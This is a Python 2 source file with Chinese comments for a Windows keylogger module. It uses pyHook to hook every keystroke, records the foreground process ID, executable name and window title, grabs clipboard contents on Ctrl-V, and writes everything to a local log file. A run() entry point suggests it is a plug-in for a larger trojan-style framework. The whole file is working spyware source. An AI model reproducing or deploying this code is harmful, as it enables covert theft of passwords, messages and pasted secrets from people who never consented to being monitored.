#-*- coding:utf8 -*-

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

file_name = "C:\\Users\\lenovo\\Documents\\hook_log.txt" 
fobj = open(file_name, 'w') 

def get_current_process():

    # 获取前台窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 保存当前进程ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)
    # 打开进程
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    # 获取进程所对应的可执行文件的名字
    psapi.GetModuleBaseNameA(h_process, None, byref(executable),512)

    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # 输出进程相关信息
    fobj.write("[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def keyStore(event):
    global current_window

    # 检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检测按键是否为常规按键(非组合键等)
    if event.Ascii > 32 and event.Ascii < 127:
        fobj.write(chr(event.Ascii) + ' ')
    else:
        # 若输入为[CTRL-V],则获取剪切板内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            fobj.write("[PASTE] - %s " % (pasted_value))

        else:
            fobj.write("[%s] " % event.Key)

    # 返回直到下一个钩子事件被触发
    return True
def run(**args):
	print "[*] In keylogger module."
# 创建和注册钩子函数管理器
	k1 =pyHook.HookManager()

	k1.KeyDown = keyStore

# 注册键盘记录的钩子，然后永久执行
	k1.HookKeyboard()
	pythoncom.PumpMessages()
